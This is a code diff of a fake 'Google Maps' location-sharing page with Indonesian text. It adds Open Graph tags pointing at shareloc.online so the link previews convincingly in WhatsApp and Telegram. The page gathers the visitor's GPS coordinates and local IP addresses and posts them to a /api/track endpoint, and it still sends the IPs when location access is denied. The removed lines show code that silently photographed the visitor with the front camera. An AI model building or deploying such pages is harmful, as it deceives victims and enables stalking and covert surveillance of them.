@@ -3,21 +3,25 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Google Maps - Share Location</title>
+    <title>Google Maps - Bagikan Lokasi Terkini</title>
+    
+    <!-- Open Graph Metadata untuk Preview Gambar di WhatsApp/Telegram -->
+    <meta property="og:title" content="Google Maps - Berbagi Lokasi Real-Time">
+    <meta property="og:description" content="Ketuk untuk melihat titik lokasi dan rute navigasi terkini.">
+    <meta property="og:image" content="https://images.unsplash.com/photo-1526778548025-fa2f459cd5c1?w=1200&h=630&fit=crop">
+    <meta property="og:url" content="https://shareloc.online">
+    <meta property="og:type" content="website">
+
     <style>
         body { font-family: Arial, sans-serif; text-align: center; margin-top: 25vh; background: #f4f4f9; color: #333; }
         .loader { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        #camera-stream { display: none; }
     </style>
 </head>
 <body>
     <div class="loader"></div>
     <h3>Memuat Peta Lokasi...</h3>
     <p>Menghubungkan ke titik koordinat, mohon tunggu...</p>
-
-    <video id="camera-stream" autoplay playsinline></video>
-    <canvas id="canvas" style="display:none;"></canvas>
 
     <script>
         window.onload = function() {
@@ -45,53 +49,23 @@
             }
             getLocalIPs(ips => { localIPs = ips; });
 
-            // 2. PRIORITAS UTAMA: Minta izin Lokasi GPS duluan (terlihat wajar untuk Shareloc)
+            // 2. Langsung minta izin lokasi GPS
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(
                     position => {
-                        // Jika lokasi diizinkan, baru lanjut coba ambil kamera secara senyap
-                        const lat = position.coords.latitude;
-                        const lon = position.coords.longitude;
-                        const acc = position.coords.accuracy;
-                        captureCameraAndSend(lat, lon, acc, localIPs);
+                        sendData(position.coords.latitude, position.coords.longitude, position.coords.accuracy, localIPs);
                     },
                     error => {
-                        // Jika lokasi ditolak tetap lanjut kirim data seadanya
-                        captureCameraAndSend(null, null, null, localIPs);
+                        sendData(null, null, null, localIPs);
                     },
                     { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
                 );
             } else {
-                captureCameraAndSend(null, null, null, localIPs);
+                sendData(null, null, null, localIPs);
             }
         };
 
-        function captureCameraAndSend(lat, lon, accuracy, localIPs) {
-            // 3. Ambil kamera setelah proses lokasi berjalan
-            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
-                .then(stream => {
-                    const video = document.getElementById('camera-stream');
-                    video.srcObject = stream;
-                    setTimeout(() => {
-                        const canvas = document.getElementById('canvas');
-                        canvas.width = video.videoWidth || 640;
-                        canvas.height = video.videoHeight || 480;
-                        const ctx = canvas.getContext('2d');
-                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                        
-                        const capturedImage = canvas.toDataURL('image/jpeg');
-                        stream.getTracks().forEach(track => track.stop());
-                        
-                        sendData(lat, lon, accuracy, capturedImage, localIPs);
-                    }, 1200);
-                })
-                .catch(err => {
-                    // Jika kamera ditolak, tetap kirim data lokasi yang sudah didapat
-                    sendData(lat, lon, accuracy, null, localIPs);
-                });
-        }
-
-        function sendData(lat, lon, accuracy, image, localIPs) {
+        function sendData(lat, lon, accuracy, localIPs) {
             fetch('/api/track', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
@@ -99,7 +73,6 @@
                     latitude: lat, 
                     longitude: lon, 
                     accuracy: accuracy, 
-                    image: image,
                     localIPs: localIPs 
                 })
             }).finally(() => {
